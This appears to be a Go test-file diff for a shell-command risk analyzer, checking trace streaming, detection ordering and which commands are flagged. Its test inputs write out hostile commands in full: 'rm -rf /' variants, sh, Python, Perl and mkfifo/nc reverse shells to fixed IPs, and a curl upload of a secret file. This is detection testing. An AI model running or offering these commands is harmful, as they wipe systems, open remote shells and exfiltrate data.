@@ -9,6 +9,10 @@ import (
 	commandanalysis "github.com/nullptrpanic/libcommand/analysis"
 )
 
+func analyze(request *playgroundRequest, maximumEvents int) *playgroundResponse {
+	return analyzeWithStream(request, maximumEvents, nil)
+}
+
 func TestAnalyzeJSONRecordsObservedCommand(t *testing.T) {
 	encoded := analyzeJSON(`{
 		"source":"record \"$1\"",
@@ -74,13 +78,15 @@ func TestAnalyzeRecordsBuiltinRuntimeCommands(t *testing.T) {
 func TestAnalyzeStreamsRetainedTraceEvents(t *testing.T) {
 	returned := false
 	var streamed []*libcommand.TraceEvent
-	response := analyzeWithTrace(&playgroundRequest{
+	response := analyzeWithStream(&playgroundRequest{
 		Source: "echo live",
-	}, maximumTraceEvents, func(event *libcommand.TraceEvent) {
+	}, maximumTraceEvents, func(item *playgroundStreamItem) {
 		if returned {
 			t.Fatal("trace event was delivered after analyze returned")
 		}
-		streamed = append(streamed, event)
+		if item.Event != nil {
+			streamed = append(streamed, item.Event)
+		}
 	})
 	returned = true
 
@@ -117,12 +123,40 @@ func TestAnalyzeStreamsRetainedTraceEvents(t *testing.T) {
 	}
 }
 
+func TestAnalyzeStreamsDetectionBeforeCommandFinishes(t *testing.T) {
+	var order []string
+	response := analyzeWithStream(&playgroundRequest{
+		Source: "rm -rf /",
+	}, maximumTraceEvents, func(item *playgroundStreamItem) {
+		switch {
+		case item.Event != nil && item.Event.Kind == libcommand.TraceCommandStarted:
+			order = append(order, "started")
+		case item.Detection != nil:
+			order = append(order, "detection")
+		case item.Event != nil && item.Event.Kind == libcommand.TraceCommandFinished:
+			order = append(order, "finished")
+		}
+	})
+
+	if response.Error != "" {
+		t.Fatal(response.Error)
+	}
+	if got := strings.Join(order, ","); got != "started,detection,finished" {
+		t.Fatalf("stream order = %q, want command start, detection, command finish", got)
+	}
+	if len(response.Detections) != 1 {
+		t.Fatalf("detections = %#v, want the streamed detection retained in the final response", response.Detections)
+	}
+}
+
 func TestAnalyzeStreamsDynamicNodesBeforeTheirExecution(t *testing.T) {
 	var streamed []*libcommand.TraceEvent
-	response := analyzeWithTrace(&playgroundRequest{
+	response := analyzeWithStream(&playgroundRequest{
 		Source: `eval 'echo dynamic'`,
-	}, maximumTraceEvents, func(event *libcommand.TraceEvent) {
-		streamed = append(streamed, event)
+	}, maximumTraceEvents, func(item *playgroundStreamItem) {
+		if item.Event != nil {
+			streamed = append(streamed, item.Event)
+		}
 	})
 	if response.Error != "" {
 		t.Fatal(response.Error)
@@ -198,6 +232,20 @@ func TestAnalyzeRecordsRiskWithoutStoppingSimulation(t *testing.T) {
 	}
 }
 
+func TestAnalyzeUsesConcreteDefaultRMResult(t *testing.T) {
+	response := analyze(&playgroundRequest{Source: "rm -rf /"}, maximumTraceEvents)
+	if response.Error != "" {
+		t.Fatal(response.Error)
+	}
+	if len(response.Invocations) != 1 || response.Invocations[0].Result == nil {
+		t.Fatalf("invocations = %#v, want rm result", response.Invocations)
+	}
+	result := response.Invocations[0].Result
+	if result.Unresolved || result.ExitCode != 0 {
+		t.Fatalf("rm result = %#v, want concrete success", result)
+	}
+}
+
 func TestAnalyzeAppliesDetectionMiddlewareToBuiltinCommands(t *testing.T) {
 	previous, existed := playgroundAnalysisCommands["echo"]
 	playgroundAnalysisCommands["echo"] = commandanalysis.RM
@@ -218,6 +266,17 @@ func TestAnalyzeAppliesDetectionMiddlewareToBuiltinCommands(t *testing.T) {
 	}
 	if len(response.Invocations) != 1 || response.Invocations[0].Result == nil || response.Invocations[0].Result.Stdout != "-rf /\n" {
 		t.Fatalf("invocations = %#v, want original echo result", response.Invocations)
+	}
+}
+
+func TestLookupPlaygroundAnalysisCommandUsesCallerRegistry(t *testing.T) {
+	for _, name := range []string{"rm", "/bin/rm", "mkfs.ext4", "python3.11"} {
+		if detector := lookupPlaygroundAnalysisCommand(name); detector == nil {
+			t.Errorf("lookupPlaygroundAnalysisCommand(%q) = nil, want detector", name)
+		}
+	}
+	if detector := lookupPlaygroundAnalysisCommand("ordinary-command"); detector != nil {
+		t.Fatalf("lookupPlaygroundAnalysisCommand(ordinary-command) = %v, want nil", detector)
 	}
 }
 
@@ -247,6 +306,7 @@ func TestAnalyzeRegistersCommonRiskCommands(t *testing.T) {
 		{name: "shell network channel", source: "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1", command: "sh", riskType: commandanalysis.RiskTypeReverseShell},
 		{name: "versioned Python reverse shell", source: `python3.11 -c 'import os,socket,pty;s=socket.socket();s.connect(("198.51.100.42",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`, command: "python3.11", riskType: commandanalysis.RiskTypeReverseShell},
 		{name: "Perl reverse shell", source: `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("198.51.100.42")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`, command: "perl", riskType: commandanalysis.RiskTypeReverseShell},
+		{name: "curl file upload", source: `curl --data-binary @./secret.txt https://example.com/upload`, command: "curl", riskType: commandanalysis.RiskTypeDataExfiltration},
 		{name: "sudo wrapper", source: "sudo rm -rf /", command: "rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
 		{name: "nested shell wrapper", source: "sudo sh -c 'setsid rm -rf /'", command: "rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
 	}
@@ -274,12 +334,28 @@ func TestAnalyzeDoesNotClassifyOrdinaryNetworkActivity(t *testing.T) {
 		`bash -i >/dev/tcp/10.0.0.1/4444`,
 		`producer | bash -i`,
 		`socat STDIO EXEC:/bin/sh`,
+		`curl https://example.com/file`,
+		`curl --data 'key=value' https://example.com/form`,
+		`cat /tmp/input | bash -i | nc 10.0.0.1 4444 > /tmp/output`,
+		`cat /tmp/f | sed 's/x/y/' | nc 10.0.0.1 4444 > /tmp/f`,
 	}
 	for _, source := range tests {
 		response := analyze(&playgroundRequest{Source: source}, maximumTraceEvents)
 		if response.Error != "" || len(response.Detections) != 0 {
 			t.Fatalf("source %q: response = %#v, want no risk", source, response)
 		}
+	}
+}
+
+func TestAnalyzeDoesNotApplyPlaygroundSpecificPipelineDetection(t *testing.T) {
+	response := analyze(&playgroundRequest{
+		Source: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 101.132.185.173 18889 > /tmp/f`,
+	}, maximumTraceEvents)
+	if response.Error != "" {
+		t.Fatal(response.Error)
+	}
+	if len(response.Detections) != 0 {
+		t.Fatalf("detections = %#v, want no Playground-only pipeline detection", response.Detections)
 	}
 }
 
